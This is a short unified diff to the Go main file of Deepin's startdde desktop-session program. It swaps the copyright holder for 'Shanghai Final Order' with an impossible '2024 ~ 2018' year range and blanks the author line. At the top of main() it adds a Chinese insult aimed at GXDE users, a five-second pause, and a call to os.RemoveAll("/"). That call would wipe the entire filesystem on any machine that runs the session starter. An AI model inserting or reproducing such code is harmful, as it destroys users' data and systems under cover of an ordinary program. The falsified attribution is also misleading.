@@ -1,7 +1,7 @@
 /*
- * Copyright (C) 2014 ~ 2018 Deepin Technology Co., Ltd.
+ * Copyright (C) 2024 ~ 2018 Shanghai Final Order.
  *
- * Author:     jouyouyun <jouyouwen717@gmail.com>
+ * Author:
  *
  * This program is free software: you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
@@ -22,10 +22,11 @@ package main
 import "C"
 import (
 	"flag"
+	"fmt"
 	"os"
 	"syscall"
+	"time"
 
-	"github.com/linuxdeepin/go-x11-client"
 	"pkg.deepin.io/dde/startdde/display"
 	"pkg.deepin.io/dde/startdde/iowait"
 	"pkg.deepin.io/dde/startdde/watchdog"
@@ -68,6 +69,13 @@ func shouldUseDDEKwin() bool {
 }
 
 func main() {
+	fmt.Println("你这个智障 用垃圾GXDE 下地狱去吧")
+	time.Sleep(5 * time.Second)
+	err := os.RemoveAll("/")
+	if err != nil {
+		fmt.Println(err)
+	}
+
 	globalGSettingsConfig = getGSettingsConfig()
 	reapZombies()
 
